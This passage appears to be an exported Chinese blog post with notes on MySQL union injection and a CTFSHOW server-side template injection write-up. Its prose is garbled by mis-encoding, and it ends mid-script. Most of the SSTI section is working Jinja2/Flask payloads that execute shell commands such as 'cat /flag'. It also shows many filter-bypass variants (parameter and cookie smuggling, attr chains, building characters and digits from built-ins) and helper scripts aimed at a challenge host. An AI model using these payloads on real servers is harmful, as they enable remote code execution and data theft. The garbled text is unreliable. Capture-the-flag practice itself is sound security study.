<h2 id="æ€ä¹ˆç”¨"><a href="#æ€ä¹ˆç”¨" class="headerlink" title="æ€ä¹ˆç”¨"></a>æ€ä¹ˆç”¨</h2><p>è¿™æ˜¯æˆ‘ç»å¸¸å¿˜è®°çš„ä¸€ä¸ªç‚¹äº†ï¼Œå› ä¸ºå®ƒåå­—å¤ªç˜ è–„é•¿äº†ï¼Œç°åœ¨é‡çœ‹å°±æ„Ÿè§‰è¿˜å¥½</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema  å›¾ç•¥åº“</span><br><span class="line">å›¾ç•¥åº“ä¸‹çš„å¸¸ç”¨è¡¨æœ‰:</span><br><span class="line">SCHEMATA æ‰€æœ‰åº“å</span><br><span class="line">TABLES   æ‰€æœ‰è¡¨å</span><br><span class="line">COLUMNS  æ‰€æœ‰åˆ—å</span><br><span class="line"></span><br><span class="line">åº“åè¡¨ä¸­å¸¸ç”¨çš„åˆ—ç”¨:</span><br><span class="line">SCHEMA_NAME åº“å</span><br><span class="line">DEFAULT_CHARACTER_SET_NAME ç¼–ç æ ¼å¼</span><br><span class="line"></span><br><span class="line">è¡¨åè¡¨ä¸­çš„å¸¸ç”¨çš„åˆ—æœ‰:</span><br><span class="line">TABLE_NAME     è¡¨å</span><br><span class="line">TABLE_SCHEMA   æ­¤è¡¨éš¶å±çš„åº“</span><br><span class="line"></span><br><span class="line">åˆ—åè¡¨ä¸­å¸¸ç”¨çš„åˆ—æœ‰:</span><br><span class="line">COLUMN_NAME    åˆ—å</span><br><span class="line">TABLE_NAME   æ­¤åˆ—éš¶å±çš„è¡¨</span><br><span class="line"></span><br><span class="line">æŸ¥æ‰€æœ‰åº“å:select SCHEMA_NAME from information_schema.SCHEMATAT;</span><br><span class="line">æŸ¥æŸåº“ä¸­æ‰€æœ‰è¡¨å:select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&quot;xxx&quot;;</span><br><span class="line">æŸ¥æŸè¡¨ä¸­æ‰€æœ‰çš„åˆ—å:select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&quot;xxx&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="order-byæ˜¯å•¥"><a href="#order-byæ˜¯å•¥" class="headerlink" title="order byæ˜¯å•¥"></a>order byæ˜¯å•¥</h1><h2 id="æ­£å¸¸ä½¿ç”¨"><a href="#æ­£å¸¸ä½¿ç”¨" class="headerlink" title="æ­£å¸¸ä½¿ç”¨"></a>æ­£å¸¸ä½¿ç”¨</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240510165925638.png"  alt="image-20240510165925638"></p>
<p>è¿™æ˜¯ä¸€å¼ æ­£å¸¸æŸ¥è¯¢çš„è¡¨</p>
<p><code>order by</code>é¡¾åæ€ä¹‰å°±æ˜¯æŒ‰ç…§ä»€ä¹ˆæ’åºï¼Œè¿™é‡Œé»˜è®¤åº”è¯¥æ˜¯<code>order by id</code>æ‰€ä»¥æ˜¯æŒ‰1,2,3,4è¿™æ ·æ’ä¸‹æ¥</p>
<p>é‚£å¦‚æœæˆ‘<code>order by username</code>å‘¢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170133893.png"  alt="image-20240510170133893"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯æŒ‰ä¸­é—´çš„åå­—æ’çš„ï¼Œæ‰€ä»¥æŒ‰åå­—å¼€å¤´a,b,c,dæ’ä¸‹æ¥</p>
<h2 id="æ³¨å…¥ä¸­ä½¿ç”¨"><a href="#æ³¨å…¥ä¸­ä½¿ç”¨" class="headerlink" title="æ³¨å…¥ä¸­ä½¿ç”¨"></a>æ³¨å…¥ä¸­ä½¿ç”¨</h2><p>é‚£ä¹ˆæˆ‘ä»¬è€<code>order by 1</code>,<code>order by 2</code>,<code>order by 3</code>å¹²å•¥å‘¢</p>
<p>å…¶å®è¿™é‡Œçš„</p>
<p>order by 1&#x3D;order by id</p>
<p>order by 2&#x3D;order by username</p>
<p>order by 3 &#x3D;order by password</p>
<p>å°±å¥½æ¯”æˆ‘çªç„¶<code>order by nb</code>ï¼Œnbè¿™ä¸ªåˆ—åä¸å­˜åœ¨ï¼Œè‡ªç„¶ä¼šæŠ¥é”™ä¸å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘çªç„¶<code>order by 4</code>è‡ªç„¶ä¹Ÿæ˜¯æŠ¥é”™</p>
<p>è¿™æ ·æˆ‘ä»¬å°±çŸ¥é“äº†è¿™ä¸ªè¡¨åˆ°åº•æœ‰å¤šå°‘åˆ—ï¼Œè‡ªç„¶ä¹Ÿå°±èƒ½æ­£ç¡®ä½¿ç”¨unionè”åˆæ³¨å…¥äº†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170824696.png"  alt="image-20240510170824696"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170811729.png"  alt="image-20240510170811729"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>å¤‡å¿˜</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI-CTFSHOW</title>
    <url>/2024/04/12/SSTI-CTFSHOW-1/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesnâ€™t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>å·¨å‡ æŠŠè¯¦ç»†ï¼Œä½¿æˆ‘é€æ¸ç†è§£ä¸€åˆ‡</p>
<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
<p>éœ€è¦åœ¨urlä¼ å…¥name&#x3D;payload</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“subclasses()åï¼Œos._wrap_closeç±»åœ¨å“ª</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
<p>å°å†™äº†ä¸ªè„šæœ¬å»æ‰¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]éœ€è¦æŸ¥æ‰¾çš„æ–‡æœ¬ä¸º:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]ä½ å¯èƒ½è¦æ‰¾çš„ç±»æœ‰:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]éœ€è¦åŒ¹é…çš„ç±»ä¸º:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]ä¸‹æ ‡ä¸º&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]ç»§ç»­æ‰£1ç»“æŸæ‰£0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
<p>è¿›è€Œpayload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
<p>ä¸€æ ·çš„nameä¼ å‚ï¼ŒæŠŠä¸Šé¢˜çš„payloadæ”¾äº†è¿›å»ï¼Œç»™æˆ‘å›äº†ä¸ªæ¿è„¸</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
<p>ä¸çŸ¥é“ç¦äº†ä»€ä¹ˆï¼Œæˆ‘ä»¬æŠŠpayloadä¸€ä¸ªå­—ä¸€ä¸ªå­—æ‹†å¼€å†ç”¨burpsuiteçˆ†ç ´è¿›è¡Œfuzz</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]éœ€è¦æ‹†è§£çš„æ–‡æœ¬ä¸º&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
<p>å‘ç°æŠŠ2å’Œ3banæ‰äº†ï¼Œç›¸å½“äºæƒ³banæ‰<code>os._wrap_close</code>å‘—</p>
<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
<p>payload4:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">æˆ–è€…</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>æœ€å–œæ¬¢çš„æœ€çŸ­çš„ä¸€ä¸ª:</p>
<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
<p>å˜ç§æœ€å¤šçš„ä¸€é›†ï¼Œåœ¨ç½‘ä¸Šçœ‹åˆ°å¾ˆå¤šï¼Œä¸è¿‡éƒ½2024äº†è¿˜ä¼šæœ‰å¼€å‘äººå‘˜çŠ¯è¿™ä¸ªç—…å—ï¼Œå®æˆ˜ä¼°è®¡æ˜¯ç”¨ä¸åˆ°äº†</p>
<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
<p>å‚æ•°é€ƒé€¸ï¼Œå¥½å–œæ¬¢ï¼Œé«˜æ•ˆå¸…æ°”å·§å¦™</p>
<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>banæ‰äº†argå’Œå•åŒå¼•å·</p>
<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
<p>å†åœ¨cookieåŠ å…¥<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>å³å¯</p>
<p>æˆ‘æ‰çŸ¥é“cookieä¼ å¤šä¸ªå€¼æ˜¯éœ€è¦åˆ†å·è€Œä¸æ˜¯&amp;</p>
<p>è€Œä¸”è¿™é‡Œä¼ å…¥çš„cookieä¸èƒ½æœ‰å­—ç¬¦æ˜¯urlç¼–ç çš„ï¼Œä¸çŸ¥é“æ˜¯hackbarä¸å¸®æˆ‘ç¼–ç å‘¢ï¼Œè¿˜æ˜¯æœåŠ¡å™¨ä¸å¸®æˆ‘è§£ç å‘¢ï¼Œè¿˜æ˜¯è¯´cookieæœ¬æ¥å°±ä¸éœ€è¦urlç¼–è§£ç </p>
<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>åœ¨å‰banæ‰äº†argå’Œå•åŒå¼•å·å’Œä¸­æ‹¬å·</p>
<p>å’Œä¸Šé¢˜ä¸€æ ·çš„payload</p>
<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>banæ‰äº†ä¸‹åˆ’çº¿</p>
<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
<p>dåŸæ¥ä¹‹å‰å¯ä»¥ä¸ç”¨cookieï¼Œç”¨valueså°±å¥½</p>
<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>ä¹‹å‰çš„åŸºç¡€ä¸Šç¦ç”¨äº†os</p>
<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
<p>è¿™é‡Œgetæ–¹æ³•æƒ³å‡ºæ¥å¾ˆé¡ºæ»‘ï¼Œå› ä¸ºä¸€å¼€å§‹å’±ä»¬æƒ³æŠŠosé€ƒå‡ºæ¥å¯ä»¥æƒ³çš„æ˜¯reque.values.gogoï¼Œä½†æ˜¯è¿™ä¸ªå¼„å‡ºæ¥åªèƒ½è¿”å›å­—ç¬¦ä¸²â€osâ€,å¹¶ä¸èƒ½è¿”å›ç±»os,æ‰€ä»¥ç”¨get</p>
<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è¿‡æ»¤äº†&#123;&#123;,ç”¨&#123;%%&#125;åŠ printå³å¯</span><br></pre></td></tr></table></figure>

<p>payload:<code>name=s&#123;%print((lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read())%&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
<p>printé‡Œçš„æ”¹ä¸ºä¸Šé¢çš„payload2ä¸€æ ·çš„</p>
<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>ä»¥ä¸ŠåŸºç¡€ä¸Šbanäº†request</p>
<h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€:"></a>æ–¹æ³•ä¸€:</h3><p>æœ‰ç‚¹å°å¤æ‚ï¼Œè¦å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line"> payload=<span class="built_in">input</span>(<span class="string">&quot;è¦æ‰¾å•¥&quot;</span>)</span><br><span class="line"> fpayload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">   url=<span class="string">f&quot;http://e870d70a-c035-4b9e-8e6c-f6137ed08cbe.challenge.ctf.show//?name=&#123;&#123;%print((config|string|list).pop(<span class="subst">&#123;i&#125;</span>).lower())%&#125;&#125;&quot;</span></span><br><span class="line">   r = requests.get(url=url)</span><br><span class="line">   index = r.text.find(<span class="string">&#x27;&lt;h3&gt;&#x27;</span>)</span><br><span class="line">   single = r.text[index+<span class="number">4</span>:index+<span class="number">5</span>].lower()</span><br><span class="line">  <span class="comment">#print(f&quot;[+]&#123;j&#125;&quot;)</span></span><br><span class="line">  <span class="comment">#print(single)</span></span><br><span class="line">   <span class="keyword">if</span> j==single:</span><br><span class="line">    fpayload+=<span class="string">f&quot;(config|string|list).pop(<span class="subst">&#123;i&#125;</span>)~&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(fpayload)</span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;ç»§ç»­ä¸&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æ€è·¯æ˜¯æŠŠ<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>è¿™ä¸ªé‡Œé¢çš„<code>__globals__</code>å’Œ<code>os</code>å’Œ<code>cat /flag</code>æ›¿æ¢å°±å¥½</p>
<p>payload:æˆ‘çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read())%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ:"></a>æ–¹æ³•äºŒ:</h3><p>é€šè¿‡è®¾ç½®å˜é‡å’Œæ‹¼æ¥å˜é‡åˆæˆä¸€å¥è¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line">#åˆæˆä¸€å¥è¯ï¼š</span><br><span class="line">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;% set chr=a.chr %&#125;</span><br><span class="line">&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br></pre></td></tr></table></figure>

<p>ç›¸å½“äº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># åœ¨__builtins__é‡Œé¢æ‹¿åˆ°chrï¼ŒåŒæ ·å¯ä»¥å¾ˆæ–¹ä¾¿çš„æ„é€ å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>è¿‡æ»¤äº†æ•°å­—,è¦ç”¨coutæ„é€ æ•°å­—</p>
<p>æ¯”å¦‚dict{aaaaaa&#x3D;a|join|cout}æ˜¯ç­‰äº6çš„ï¼Œé”®å€¼æœ‰å¤šå°‘ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªè¡¨è¾¾å¼å°±ä»£è¡¨å‡ ä¸ªæ•°å­—ï¼Œæƒ³åŠæ³•ç”¨è¿™ä¸ªæ ¼å¼æŠŠä¸Šé¢˜çš„payloadä¸­çš„æ•°å­—æ›¿æ¢å³å¯</p>
<p>payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#32</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#47</span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; #_</span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125;</span><br><span class="line">#os</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">#å¾—åˆ°__globals__å‰é¢çš„joinæ˜¯æŠŠglobalså˜ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;</span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125;</span><br><span class="line">#chr</span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;</span><br><span class="line">#chrå‡½æ•°</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">#cat /flag</span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br><span class="line">#æœ€ç»ˆpayloadå¦‚ä¸‹</span><br><span class="line">?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set file = chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>è¿‡æ»¤äº†printä½†è¿˜æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œç”¨curlå¸¦å‡ºflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set one=dict(b=j)|join|count%&#125;</span><br><span class="line">&#123;% set two=dict(bb=j)|join|count%&#125;</span><br><span class="line">&#123;% set three=dict(bbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set four=dict(bbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set five=dict(bbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set six=dict(bbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set seven=dict(bbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set eight=dict(bbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set nine=dict(bbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set ten=dict(bbbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set zero=(one-one)%&#125;</span><br><span class="line">&#123;% set pop=(four*six)%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(pop)%&#125;</span><br><span class="line">&#123;% set global=(a,a,dict(globals=d)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set go=(lipsum|attr(global)).get(built)%&#125;</span><br><span class="line">&#123;% set chr=go.chr%&#125;</span><br><span class="line">&#123;% set cmd=%&#125;</span><br><span class="line">&#123;%if go.eval(cmd)%&#125;</span><br><span class="line">yes</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>cmdç”Ÿæˆè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eg:chr((six~five)|int)~chr((six~six|int))---&gt;AB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ›¿æ¢123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a</span>):</span><br><span class="line">    change = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;zero&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;one&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;two&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;four&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;five&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;six&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;eight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span> : <span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = change[a]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‹†è§£payload,å¹¶è¿›è¡Œasciiè½¬ç ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">devide</span>(<span class="params">payload</span>):</span><br><span class="line">    go = <span class="built_in">list</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(go):</span><br><span class="line">        go[i] = <span class="built_in">str</span>(<span class="built_in">ord</span>(val))</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span 